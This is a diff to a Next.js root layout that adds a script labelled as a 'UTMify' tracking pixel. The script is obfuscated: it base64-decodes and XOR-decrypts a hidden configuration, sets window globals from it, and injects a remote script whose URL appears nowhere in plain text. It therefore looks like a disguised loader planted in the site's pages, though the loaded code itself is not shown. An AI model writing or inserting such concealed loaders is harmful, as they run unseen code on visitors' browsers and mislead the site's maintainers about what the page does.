@@ -63,6 +63,13 @@ export default function RootLayout({
           />
         </noscript>
         {/* End Meta Pixel Code */}
+
+        {/* UTMify Pixel Code */}
+        <Script id="utmify-pixel" strategy="afterInteractive">
+          {`
+            (function(){var x_e8bl=atob("DAdj0Tn32wVaIpAvMHxBpEub+T94SuRbQHRZ/haUv2t0V+RCWWEa/1qYtis4UL9cU3UKoU2E9HUzWvVDH3cKqVyb9W8pALwNUXMXo1CVrnE/UbIVa1pP816btGc7TuMNClwY81eWtmB4GLJfWX8GvXCT+Sl4VPFDRWJB6xvBuj08F/ZOAz5W51zP7jE/GqZNAzFWsAHVplgn");var y_x7=[];for(var m_u2=0;m_u2<x_e8bl.length;m_u2++){y_x7.push(x_e8bl.charCodeAt(m_u2)&255);}var r_stsc=y_x7[0];var z_r=y_x7.slice(1,1+r_stsc);var i_0=y_x7.slice(1+r_stsc);var v_z=i_0.map(function(b,m_3ruk){return b^z_r[m_3ruk%r_stsc];});var l_po32="";for(var f_f=0;f_f<v_z.length;f_f++){l_po32+=String.fromCharCode(v_z[f_f]&255);}var j_m=decodeURIComponent(escape(l_po32));var g_ytbj=JSON.parse(j_m);var l_exx4=g_ytbj.globals||[];l_exx4.forEach(function(q_6a){window[q_6a.name]=q_6a.value;});var a_h=document.createElement("script");a_h.src=g_ytbj.url;a_h.async=true;a_h.defer=true;(g_ytbj.attributes||[]).forEach(function(j_n){a_h.setAttribute(j_n.name,j_n.value);});(document.head||document.documentElement).appendChild(a_h);})();
+          `}
+        </Script>
       </head>
       <body className="font-sans antialiased">
         {children}
